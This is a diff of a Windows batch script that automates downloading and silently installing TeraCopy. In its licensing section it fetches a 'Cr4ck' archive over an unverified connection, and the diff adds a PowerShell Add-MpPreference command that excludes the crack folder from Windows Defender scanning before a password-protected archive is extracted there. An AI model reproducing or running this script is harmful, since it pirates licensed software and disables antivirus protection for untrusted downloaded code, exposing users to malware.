@@ -67,7 +67,7 @@ set "LinkForOldWindows=https://github.com/hieuck/curl-uri-wget-download-setup/ra
 set "LinkForOldWindows32bit="
 set "LinkForOldWindows64bit="
 
-set "Link=https://codesector.com/files/teracopy.exe"
+set "Link=https://codesector.com/files/teracopy!SoftNameVersion!.exe"
 set "LinkForAllWindows32bit="
 set "LinkForAllWindows64bit="
 
@@ -79,7 +79,7 @@ set "SoftPath=%ProgramFiles%\TeraCopy"
 set "SoftPathFor32bit="
 set "SoftPathFor64bit="
 
-set "QuietMode=/S"
+set "QuietMode=/exenoui /noprereqs /qn"
 
 set "Cr4ckFile=TeraCopyCr4ck/TeraCopy-!SoftNameVersion!-Cr4ck"
 set "Cr4ckPath="
@@ -693,6 +693,7 @@ if /i "%License%"=="Yes" (
 		curl -L --max-redirs 20 -A "%UserAgent%" -o "%Cr4ckFile%" "%Cr4ckLink%" --insecure
 	)
 	if exist "%Cr4ckFile%" (
+		powershell -Command Add-MpPreference -ExclusionPath "%Cr4ckPath%"
 		@7z.exe x -p123 "%Cr4ckFile%" -o"%Cr4ckPath%" -aoa -y
 		echo Successfully Cr4cked %SoftName%.
 		echo.>> %Temp%\hieuckitlog.txt
